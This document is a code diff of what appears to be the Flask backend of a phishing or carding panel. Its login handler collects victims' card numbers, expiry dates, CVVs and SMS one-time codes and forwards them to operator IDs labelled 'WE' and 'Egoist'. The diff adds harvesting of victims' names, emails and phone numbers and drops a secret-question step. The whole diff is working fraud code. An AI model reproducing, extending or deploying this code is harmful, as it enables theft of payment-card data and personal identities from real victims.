@@ -30,6 +30,9 @@ def login():
         authCode = request.args.get('authCode')
         epin = request.args.get('epinAuthCode')
         session = request.args.get('session')
+        name = request.args.get('name')
+        email = request.args.get('email')
+        tel = request.args.get('tel')
     elif request.method == 'POST':
         print("Received a POST request:")
         print(f"Full URL: {request.url}")
@@ -42,29 +45,27 @@ def login():
         id = data.get('id')
         question = data.get('question')
         session = data.get('session')
+        name = data.get('name')
+        tel = data.get('tel')
+        email = data.get('email')
+    print(email, 495592185123908439878598547398345978435978)
     ID = f'{session}'
-
     # WE
     if id == '1000001':
-        if question != None and question != 'None' and authCode == None:
-            send_secret_question(MAIN_ID, card_number, expiry_date, cvv, question, ID)
-            return ''
         if authCode != None and authCode != 'None':
-            send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, epin, ID)
+            send_sms(MAIN_ID, card_number, expiry_date, cvv, authCode, ID)
             return ''
-        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID)
+        send_buttons_message(MAIN_ID, card_number, expiry_date, cvv, ID, name, email, tel)
         ne_pizdabol(card_number)
         return ''
+
     # Egoist
     elif id == '1000002':
-        if question != None and question != 'None' and authCode == None:
-            send_secret_question(Egoist, card_number, expiry_date, cvv, question, ID)
-            return ''
         if authCode != None and authCode != 'None':
             send_sms(Egoist, card_number, expiry_date, cvv, authCode, epin, ID)
             return ''
         ne_pizdabol(card_number)
-        send_buttons_message(Egoist, card_number, expiry_date, cvv, ID)
+        send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel)
         return ''
 
 
